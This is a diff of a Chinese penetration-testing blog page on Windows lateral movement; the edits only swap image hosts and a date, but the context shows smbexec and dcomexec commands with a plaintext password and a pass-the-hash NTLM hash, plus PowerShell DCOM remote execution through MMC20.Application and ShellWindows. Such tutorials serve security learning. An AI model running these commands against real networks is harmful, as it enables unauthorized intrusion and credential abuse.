@@ -271,7 +271,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902171015.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902171015.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-04
+                    2021-11-22
                 </div>
                 
 
@@ -475,7 +475,7 @@
 <h3 id="impacket-版"><a href="#impacket-版" class="headerlink" title="impacket 版"></a>impacket 版</h3><p>在 impacket 工具包里包含了 smbexec.py 工具，使用起来也很简单。</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902153131.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902153131.png"></p>
 <h3 id="Linux-跨平台-Windows-远程命令执行"><a href="#Linux-跨平台-Windows-远程命令执行" class="headerlink" title="Linux 跨平台 Windows 远程命令执行"></a>Linux 跨平台 Windows 远程命令执行</h3><p>smbexec 工具包下载地址：<a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p>
 <p>这里安装以 Kali 为例</p>
 <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.git
@@ -526,11 +526,11 @@ sudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span><
 7. Main menu             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>获取目标系统 UAC 的状态</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902163458.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902163458.png"></p>
 <p>获取目标系统中的网络共享目录</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902163631.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902163631.png"></p>
 <p>获取本地哈希</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902161205.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902161205.png"></p>
 <h2 id="2、DCOM-在远程系统中的使用"><a href="#2、DCOM-在远程系统中的使用" class="headerlink" title="2、DCOM 在远程系统中的使用"></a>2、DCOM 在远程系统中的使用</h2><p>COM 即组件对象模型 (Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成。</p>
 <p>COM 是许多微软产品和技术如 Windows 媒体播放器和 Windows Server 的基础。</p>
 <p>DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。</p>
@@ -556,7 +556,7 @@ sudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span><
 <p>在 MMC20.Application 中有个 ExecuteShellCommand 方法，我们可以拿它来执行命令，比如启动个计算器</p>
 <pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902171015.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902171015.png"></p>
 <p>除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等等可以被我们利用。</p>
 <h3 id="使用-DCOM-在远程主机上执行命令"><a href="#使用-DCOM-在远程主机上执行命令" class="headerlink" title="使用 DCOM 在远程主机上执行命令"></a>使用 DCOM 在远程主机上执行命令</h3><p>在使用该方法时，需要具备以下条件：</p>
 <ul>
@@ -570,14 +570,14 @@ $com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F
 或者
 [Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902175722.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902175722.png"></p>
 <p>2、调用 ShellWindows 远程执行命令</p>
 <pre class="line-numbers language-none"><code class="language-none">$com&#x3D;[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;))
 $com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
 或者
 [Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902175207.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902175207.png"></p>
 <p>以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。</p>
 <p>除了 MMC20.Application 和 ShellWindows，还有以下这几种 DCOM 对象可以被利用。</p>
 <p>3、调用 Excel.Application 远程执行命令</p>
@@ -622,14 +622,14 @@ $com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&
 <p>如果只知道 hash 也可以用 hash 去连接</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator@192.168.7.7 -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210904110328.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210904110328.png"></p>
 <blockquote>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752145">https://cloud.tencent.com/developer/article/1752145</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -781,7 +781,7 @@ $com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&
                 <a href="/210907-121204.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210907113159.png" class="responsive-img" alt="【内网学习笔记】24、SPN 的应用">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210907113159.png" class="responsive-img" alt="【内网学习笔记】24、SPN 的应用">
                         
                         <span class="card-title">【内网学习笔记】24、SPN 的应用</span>
                     </div>
@@ -837,7 +837,7 @@ $com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&
                 <a href="/210902-132326.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902122716.png" class="responsive-img" alt="【内网学习笔记】22、PsExec 和 WMI 的使用">
+                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/20210902122716.png" class="responsive-img" alt="【内网学习笔记】22、PsExec 和 WMI 的使用">
                         
                         <span class="card-title">【内网学习笔记】22、PsExec 和 WMI 的使用</span>
                     </div>
